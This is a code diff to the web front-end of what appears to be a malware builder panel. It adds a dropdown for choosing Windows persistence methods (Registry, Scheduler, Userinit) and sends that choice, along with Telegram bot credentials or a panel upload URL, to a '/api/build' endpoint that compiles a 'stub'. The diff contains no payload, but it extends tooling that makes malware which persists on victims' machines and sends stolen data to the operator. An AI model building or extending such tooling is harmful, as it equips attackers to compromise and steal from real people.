@@ -1076,6 +1076,49 @@ document.getElementById('save-settings-btn').addEventListener('click', async () 
 });
 
 // --- Builder Client compiler ---
+// Persistence dropdown
+(function() {
+    const toggle = document.getElementById('persistence-toggle');
+    const dropdown = document.getElementById('persistence-dropdown');
+    const label = document.getElementById('persistence-label');
+    const noneCheck = document.getElementById('persist-none');
+    const methodChecks = dropdown.querySelectorAll('input[type="checkbox"]:not(#persist-none)');
+
+    toggle.addEventListener('click', (e) => {
+        e.stopPropagation();
+        dropdown.classList.toggle('open');
+    });
+
+    document.addEventListener('click', () => dropdown.classList.remove('open'));
+    dropdown.addEventListener('click', (e) => e.stopPropagation());
+
+    noneCheck.addEventListener('change', () => {
+        if (noneCheck.checked) {
+            methodChecks.forEach(c => { c.checked = false; });
+        }
+        updateLabel();
+    });
+
+    methodChecks.forEach(c => {
+        c.addEventListener('change', () => {
+            if (c.checked) noneCheck.checked = false;
+            updateLabel();
+        });
+    });
+
+    function updateLabel() {
+        if (noneCheck.checked) { label.textContent = 'None'; return; }
+        const selected = Array.from(methodChecks).filter(c => c.checked).map(c => {
+            if (c.value === 'registry') return 'Registry';
+            if (c.value === 'scheduler') return 'Scheduler';
+            if (c.value === 'userinit') return 'Userinit';
+            return c.value;
+        });
+        label.textContent = selected.length === 3 ? 'All Methods' : selected.length === 0 ? 'None' : selected.join(', ');
+        if (selected.length === 0) noneCheck.checked = true;
+    }
+})();
+
 document.getElementById('btn-build-stub').addEventListener('click', async () => {
     const consoleBox = document.getElementById('build-console');
     consoleBox.innerHTML = '';
@@ -1094,6 +1137,10 @@ document.getElementById('btn-build-stub').addEventListener('click', async () => 
     const panelUrl = window.location.origin + '/api/upload';
     const secretKey = currentUser.api_key || '';
 
+    const persistChecks = document.querySelectorAll('#persistence-dropdown input[type="checkbox"]:checked');
+    const persistMethods = Array.from(persistChecks).map(c => c.value).filter(v => v !== 'none');
+    const persistence = document.getElementById('persist-none').checked ? 'none' : persistMethods.join(',') || 'none';
+
     // Validation
     if (delivery === 'TELEGRAM') {
         if (!botToken || !chatId) {
@@ -1104,13 +1151,14 @@ document.getElementById('btn-build-stub').addEventListener('click', async () => 
 
     log('Initializing compilation payload...', 'info');
     log(`Delivery target selected: ${delivery}`, 'warning');
+    log(`Persistence: ${persistence}`, 'info');
     log('Contacting Python builder engine API...', 'info');
 
     try {
         const res = await fetch('/api/build', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ delivery, botToken, chatId, panelUrl, secretKey })
+            body: JSON.stringify({ delivery, botToken, chatId, panelUrl, secretKey, persistence })
         });
 
         const data = await res.json();
